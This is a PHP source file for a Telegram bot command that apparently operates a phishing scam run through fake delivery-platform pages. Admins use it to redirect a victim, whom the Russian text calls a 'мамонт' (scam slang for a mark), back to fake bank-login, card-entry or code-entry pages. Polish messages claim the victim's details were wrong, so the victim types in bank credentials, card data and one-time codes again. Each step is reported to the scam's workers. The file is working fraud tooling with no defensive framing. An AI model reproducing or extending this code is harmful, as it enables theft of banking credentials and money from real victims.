<?php

namespace App\Telegram\Commands;

use App\Events\RedirectEvent;
use App\Models\Fake;
use App\Models\Role;
use App\Models\TelegramUser;
use Log;
use Telegram\Bot\Actions;
use Telegram\Bot\Exceptions\TelegramSDKException;
use Telegram\Bot\Keyboard\Keyboard;

/**
 * Class HelpCommand.
 */
class RedirectCommand extends BaseCommand
{
    /**
     * @var string Command Name
     */
    protected $name = 'redirect';

    /**
     * @var array Command Aliases
     */

    /**
     * @var string Command Description
     */

    protected $pattern = '{track_id}{uuid}{url}{msg?}';

    protected $permissionName = Role::ADMIN;

    public function handle()
    {
        $this->replyWithChatAction(['action' => Actions::TYPING]);
        $track_id = $this->getArguments()['track_id'] ?? null;
        $uuid = $this->getArguments()['uuid'] ?? null;
        $url = $this->getArguments()['url'] ?? null;

        $fake = Fake::whereTrackId($track_id)->first();

        if (is_null($fake)) return;
        $platform = platform($fake->category->name);
        try {
            $text = "⭐️ Мамонт ввел ";
            switch ($url) {
                case "/banks":
                    $text .= "неверный лк";
                    $msgPL = 'Pan/Pani wprowadził/a nieprawidłowe dane do swojej aplikacji bankowej(Login/Gasło)';
                    break;
                case "/order":
                    $text .= "неверную карту";
                    $msgPL = 'Pan/Pani wprowadził/a nieprawidłowe dane swojej karty bankowej';
                    break;
                case "/code":
                    $text .= "неверный код";
                    $msgPL = 'Pan/Pani wpisał/a kod jaki już nie działa, albo kod jest napisany niepoprawnie. Prosimy zaczekać na nowy kod';
                    break;
                case "/success":
                    $text = "страница успешно";
                    $msgPL = 'успешно';
                    break;
                default:
                    $text = $msgPL = null;
                    break;
            }
            if (!is_null($text)) foreach ($fake->allTakeUsers()->pluck('id')->toArray() as $id)
                $this->getTelegram()->sendMessage([
                    'chat_id' => $id,
                    'text' => makeText([
                        "<b>🚛Платформа:</b> <code>$platform</code>",
                        "<b>$text</b>",
                        "<b>Трек номер:</b> <code>$fake->track_id</code>",
                    ]),
                    "parse_mode" => "html",
                ]);
        } catch (TelegramSDKException $e) {
            Log::error($e->getMessage());
        }
        event(new RedirectEvent($fake, $uuid, $url, $this->getArguments()['msg'] ?? $msgPL));
        $update = $this->getUpdate();
        $message = $update->getMessage();

        if ($update->isType('callback_query')) try {
            $this->getTelegram()->editMessageReplyMarkup([
                "chat_id" => $message->getChat()->getId(),
                "message_id" => $message->messageId,
            ]);
        } catch (TelegramSDKException $e) {
        }


        $this->replyWithMessage([
            "text" => "✅ <i>Перенаправляем</i> <code>$url</code>",
            "parse_mode" => "html"
        ]);
    }
}